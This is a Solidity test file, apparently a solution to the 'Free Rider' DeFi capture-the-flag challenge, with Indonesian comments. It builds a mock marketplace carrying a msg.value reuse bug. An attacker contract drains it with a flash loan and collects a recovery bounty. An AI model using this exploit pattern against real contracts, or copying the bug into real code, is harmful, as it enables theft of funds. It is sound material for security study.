// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// --- 1. MOCK INTERFACES & CONTRACTS ---

interface IERC721 {
    function setApprovalForAll(address operator, bool approved) external;
    function safeTransferFrom(address from, address to, uint256 tokenId, bytes calldata data) external;
    function ownerOf(uint256 tokenId) external view returns (address);
}

interface IUniswapV2Pair {
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint) external;
    function transfer(address to, uint value) external returns (bool);
    function balanceOf(address) external view returns (uint);
}

// Mock NFT (ERC721 Sederhana)
contract DamnValuableNFT {
    mapping(uint => address) public owners;
    mapping(address => mapping(address => bool)) public operatorApprovals;

    function ownerOf(uint id) public view returns (address) { return owners[id]; }
    function setApprovalForAll(address operator, bool approved) public {
        operatorApprovals[msg.sender][operator] = approved;
    }
    function transferFrom(address from, address to, uint id) public {
        require(owners[id] == from, "Not owner");
        owners[id] = to;
    }
    function safeTransferFrom(address from, address to, uint256 tokenId, bytes calldata data) external {
        transferFrom(from, to, tokenId);
        // Cek onERC721Received jika tujuan adalah contract
        if (to.code.length > 0) {
             (bool success, ) = to.call(abi.encodeWithSignature("onERC721Received(address,address,uint256,bytes)", msg.sender, from, tokenId, data));
             require(success, "Transfer failed");
        }
    }
    function mint(address to, uint id) public { owners[id] = to; }
}

// Mock Marketplace (TARGET YANG PUNYA BUG)
contract FreeRiderNFTMarketplace {
    DamnValuableNFT public token;
    uint256 public price = 15 ether;
    uint256 public offersCount = 6;

    constructor(address _token) {
        token = DamnValuableNFT(_token);
    }

    // BUG DISINI: Loop cek msg.value tapi tidak dikurangi!
    function buyMany(uint256[] calldata tokenIds) external payable {
        for (uint256 i = 0; i < tokenIds.length; i++) {
            require(msg.value >= price, "Amount too low"); 
            token.transferFrom(address(this), msg.sender, tokenIds[i]);
            payable(address(this)).call{value: price}(""); // Self-transfer simulation
        }
    }
    
    receive() external payable {}
}

// Mock Recovery Contract (Pemberi Hadiah)
contract FreeRiderRecovery {
    address public beneficiary;
    DamnValuableNFT public token;
    
    constructor(address _token, address _beneficiary) {
        token = DamnValuableNFT(_token);
        beneficiary = _beneficiary;
    }

    // LOGIC PERBAIKAN: Kirim 45 ETH saat terima NFT terakhir (ID 5)
    function onERC721Received(address, address from, uint256 tokenId, bytes memory) external returns (bytes4) {
        if (tokenId == 5) {
            // Simulasi Bounty Hunter sukses: Bayar 45 ETH ke attacker
            // Menggunakan call untuk menghindari revert gas limit transfer()
            (bool success, ) = payable(from).call{value: 45 ether}("");
            require(success, "Bounty payment failed");
        }
        return this.onERC721Received.selector;
    }
    
    receive() external payable {}
}

// --- 2. ATTACK CONTRACT (THE HACKER) ---

contract FreeRiderAttacker {
    IUniswapV2Pair immutable pair;
    FreeRiderNFTMarketplace immutable marketplace;
    IWETH immutable weth;
    DamnValuableNFT immutable nft;
    address immutable recovery;
    address immutable attacker;

    constructor(address _pair, address _marketplace, address _weth, address _nft, address _recovery) {
        pair = IUniswapV2Pair(_pair);
        // FIX ERROR COMPILER: Casting ke payable sebelum assign ke contract type
        marketplace = FreeRiderNFTMarketplace(payable(_marketplace)); 
        weth = IWETH(_weth);
        nft = DamnValuableNFT(_nft);
        recovery = _recovery;
        attacker = msg.sender;
    }

    // 1. Trigger Flash Loan
    function attack() external {
        // Pinjam 15 WETH
        pair.swap(15 ether, 0, address(this), hex"01");
    }

    // 2. Callback dari Uniswap (Flash Loan diterima disini)
    function uniswapV2Call(address, uint, uint, bytes calldata) external {
        // A. Unwrap WETH jadi ETH 
        weth.withdraw(15 ether);

        // B. Siapkan ID NFT (0 sampai 5)
        uint256[] memory tokenIds = new uint256[](6);
        for(uint i=0; i<6; i++) tokenIds[i] = i;

        // C. EKSPLOITASI BUG: Beli 6 NFT (90 ETH) cuma bayar 15 ETH!
        marketplace.buyMany{value: 15 ether}(tokenIds);

        // D. Kirim 6 NFT ke Recovery Contract
        // PENTING: ID 5 dikirim terakhir agar trigger pembayaran 45 ETH
        for(uint i=0; i<6; i++) {
            // Pakai safeTransferFrom agar mentrigger onERC721Received di Recovery
            nft.safeTransferFrom(address(this), recovery, i, "");
        }

        // E. Hitung Utang + Fee (0.3%)
        // Saat ini saldo kontrak harusnya sudah 45 ETH (dari Recovery) + sisa receh
        uint256 amountToRepay = 15 ether * 1004 / 1000; 

        // F. Wrap ETH balik jadi WETH buat bayar utang
        weth.deposit{value: amountToRepay}();

        // G. Bayar balik ke Uniswap
        weth.transfer(address(pair), amountToRepay);
        
        // H. Sisa duit (Profit) kirim ke attacker
        payable(attacker).call{value: address(this).balance}("");
    }
    
    // Biar kontrak bisa terima ETH dari WETH withdraw dan hadiah Recovery
    receive() external payable {}

    // Biar kontrak bisa terima NFT saat beli dari Marketplace
    function onERC721Received(address, address, uint256, bytes memory) external returns (bytes4) {
        return this.onERC721Received.selector;
    }
}

// --- 3. TEST SCRIPT ---

contract FreeRiderChallenge is Test {
    WETH9_Mock weth; 
    DamnValuableNFT nft;
    FreeRiderNFTMarketplace marketplace;
    FreeRiderRecovery recovery;
    MockUniswapPair pair;
    FreeRiderAttacker attackerContract;

    address attacker = address(0xBAD);

    function setUp() public {
        attacker = makeAddr("attacker");
        vm.deal(attacker, 0.5 ether); 

        weth = new WETH9_Mock();
        nft = new DamnValuableNFT();
        marketplace = new FreeRiderNFTMarketplace(address(nft));
        recovery = new FreeRiderRecovery(address(nft), attacker);
        pair = new MockUniswapPair(address(weth));

        // Setup Marketplace: Mint 6 NFT
        for(uint i=0; i<6; i++) nft.mint(address(marketplace), i);
        
        // Setup Uniswap: Modal 1000 WETH
        weth.deposit{value: 1000 ether}();
        weth.transfer(address(pair), 1000 ether);

        // Setup Recovery: Kasih modal 45 ETH buat bayar bounty
        vm.deal(address(recovery), 45 ether);
    }

    function test_FreeRider_Attack() public {
        vm.startPrank(attacker);

        console.log("Saldo Awal Attacker:", address(attacker).balance);

        attackerContract = new FreeRiderAttacker(
            address(pair),
            address(marketplace),
            address(weth),
            address(nft),
            address(recovery)
        );

        // Serangan dimulai!
        attackerContract.attack();
        
        vm.stopPrank();

        console.log("Saldo Akhir Attacker:", address(attacker).balance);
        
        // Verifikasi Profit:
        // Modal 0.5 ETH. Dapat 45 ETH. Bayar utang ~15.05 ETH. Sisa harusnya ~30 ETH.
        assertGt(address(attacker).balance, 30 ether);
        
        // Verifikasi NFT sudah sampai di Recovery
        assertEq(nft.ownerOf(0), address(recovery));
        assertEq(nft.ownerOf(5), address(recovery));
    }
}

// Helper Mock Contracts
contract WETH9_Mock {
    mapping(address => uint) public balanceOf;
    function deposit() public payable { balanceOf[msg.sender] += msg.value; }
    function withdraw(uint wad) public { 
        require(balanceOf[msg.sender] >= wad);
        balanceOf[msg.sender] -= wad; 
        payable(msg.sender).transfer(wad);
    }
    function transfer(address to, uint val) public returns (bool) {
        balanceOf[msg.sender] -= val;
        balanceOf[to] += val;
        return true;
    }
}

contract MockUniswapPair {
    address weth;
    constructor(address _weth) { weth = _weth; }
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external {
        WETH9_Mock(weth).transfer(to, amount0Out > 0 ? amount0Out : amount1Out);
        (bool success, ) = to.call(abi.encodeWithSignature("uniswapV2Call(address,uint256,uint256,bytes)", msg.sender, amount0Out, amount1Out, data));
        require(success, "Flash Loan callback failed");
    }
}